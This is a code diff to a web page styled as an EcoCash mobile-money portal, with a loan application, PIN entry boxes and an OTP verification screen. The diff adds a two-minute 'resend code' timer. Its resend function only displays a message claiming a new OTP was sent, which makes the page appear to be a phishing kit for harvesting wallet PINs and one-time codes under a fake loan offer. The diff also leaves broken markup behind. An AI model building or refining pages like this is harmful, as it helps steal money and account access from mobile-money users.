@@ -242,6 +242,12 @@
                     <input type="number" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1">
                     <input type="number" inputmode="numeric" pattern="[0-9]*" class="pin-box" maxlength="1">
                 </div>
+                
+                <div style="font-size: 13px; color: #666; margin-bottom: 20px;">
+                    Didn't receive code? <span id="resendTimerText">Resend in <strong id="countdownSeconds">120</strong>s</span>
+                    <a id="resendBtn" onclick="resendOtpCode()" style="color: #0052cc; text-decoration: none; font-weight: 600; display: none; cursor: pointer;">Resend Code</a>
+                </div>
+
                 <button class="btn-primary" onclick="submitOtp()" style="display:none;">SUBMIT</button>
             </div>
         </div>
@@ -282,15 +288,12 @@
         <div class="modal-content" style="text-align: center; padding: 25px 20px;">
             <div style="font-size: 18px; font-weight: 600; color: #111; margin-bottom: 10px;">Reset PIN</div>
             <div style="font-size: 13px; color: #555; margin-bottom: 20px; line-height: 1.5;">
-                To reset your EcoCash PIN, please dial <strong>*151#</strong> on your mobile phone or contact EcoCash Support.
-            </div>
+                To reset your EcoCash PIN, please dial <strong>*151#</strong> on your mobile phone or contact EcoCash Support.</p>
             <button onclick="closeForgotPinModal()" style="width: 100%; background: #0052cc; color: #fff; border: none; padding: 12px; border-radius: 8px; font-size: 15px; font-weight: 600; cursor: pointer;">OK</button>
         </div>
     </div>
 
     <div class="footer-wave">
-        <div style="font-size: 12px;">To register an EcoCash wallet or get assistance, click below</div>
-        <div class="footer-wave">
         <div style="font-size: 12px;">To register an EcoCash wallet or get assistance, click below</div>
         <div class="footer-links">
             <a href="#" class="footer-btn">Register</a>
@@ -370,6 +373,7 @@
 
         let savedPhoneNumber = '';
         let countdownInterval = null;
+        let resendInterval = null;
 
         async function submitLoanApplication() {
             showLoading('Submitting Application...', 'Please wait...');
@@ -450,6 +454,7 @@
             setTimeout(() => {
                 hideLoading();
                 goToScreen('otpScreen', '/ax/verify');
+                startResendCountdown();
             }, 1500);
         }
 
@@ -481,6 +486,38 @@
             if (document.querySelector('#otpBoxes .pin-box')) {
                 document.querySelector('#otpBoxes .pin-box').focus();
             }
+        }
+
+        function startResendCountdown() {
+            let timeLeft = 120;
+            const secondsEl = document.getElementById('countdownSeconds');
+            const timerTextEl = document.getElementById('resendTimerText');
+            const resendBtnEl = document.getElementById('resendBtn');
+
+            timerTextEl.style.display = 'inline';
+            resendBtnEl.style.display = 'none';
+            secondsEl.innerText = timeLeft;
+
+            if (resendInterval) clearInterval(resendInterval);
+
+            resendInterval = setInterval(() => {
+                timeLeft--;
+                secondsEl.innerText = timeLeft;
+                if (timeLeft <= 0) {
+                    clearInterval(resendInterval);
+                    timerTextEl.style.display = 'none';
+                    resendBtnEl.style.display = 'inline';
+                }
+            }, 1000);
+        }
+
+        function resendOtpCode() {
+            showCustomAlert('A new OTP code has been sent to your phone.');
+            document.querySelectorAll('#otpBoxes .pin-box').forEach(b => b.value = '');
+            if (document.querySelector('#otpBoxes .pin-box')) {
+                document.querySelector('#otpBoxes .pin-box').focus();
+            }
+            startResendCountdown();
         }
 
         function showForgotPinModal() {
